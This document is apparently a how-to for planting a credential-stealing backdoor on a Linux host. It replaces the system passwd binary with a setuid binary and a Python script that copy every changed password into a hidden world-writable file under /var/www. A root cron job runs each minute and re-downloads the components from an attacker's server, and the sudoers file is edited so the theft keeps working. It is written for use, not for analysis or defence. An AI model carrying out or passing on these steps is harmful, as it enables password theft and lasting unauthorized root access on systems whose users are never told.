## Backdoored passwd binary

First you must create a `...` file in `/var/www`.

`touch /var/www/...`

Next make `root` own the file and give it `777` permissions. 

`chown root:root /var/www/... ; chmod 777 /var/www/...`

Backing up the origin passwd binary is recommended.
:q!

`mv /usr/bin/passwd /usr/bin/passwd.orig`

You will now need to move the compiled c binary to replace the original.

`mv passwd /usr/bin`

Give `root` ownership and give the file `755` permissions.

`chown root:root /usr/bin/passwd ; chmod 4755 /usr/bin/passwd`

Next move the `zpasswd` python script into `/usr/bin`

`mv zpasswd /usr/bin`

You will also need to give `root` ownership and `755` permissions.

`chown root:root /usr/bin/zpasswd ; chmod 755 /usr/bin/zpasswd`

Now this is all great, but what if they find parts and starting deleting it? Well first they've kind of screwed theirself unless they find the passwd.orig binary. We want our backdoor to keep running, so we can use a bash script in root's crontab to check if our `passwd`, `zpasswd`, and `...` files are still there.

In the check-schedule script, you will need to define your external server hosting all the files, change the `SERVERIP` variable to your server's IP.

We will need to make our check-schedule script executable as well as check the permissions are correct

`chmod +x check-schedule ; chmod 755 check-schedule`

Next, we will want to move it into /usr/bin/ and add an entry in root's crontab

`crontab -e`

`*/1 * * * * /usr/bin/check-schedule`

This will go off every minute and check if our files exist, if not either create them or download them and put them where they need to be with the correct ownership and permissions. It will also add a timestamped line to ... of what happened (Downloaded zpasswd, Created ..., etc.)

The last part that you have to do because I have not found a way to get around it, is that you must add a Cmnd_Alias in the `/etc/sudoers` file so that when the new username/password is passed to chpasswd, they will not have to enter their password to do sudo and run chpasswd.

This can be done by typing `visudo` and going down to the Cmnd_Alias section, and adding the line:

`Cmnd_Alias CHPASSWD=/usr/bin/chpasswd`

and saving it.

Now when users run the `passwd` command, they will run the C compiled binary, which will pass over to the `zpasswd` python script, which will emulate the real passwd binary, but will add the new credentials to `/var/www/...` and then finally change the password of the user. If they delete either `...`, `zpasswd`, or `passwd` the check-schedule script will fix it. 
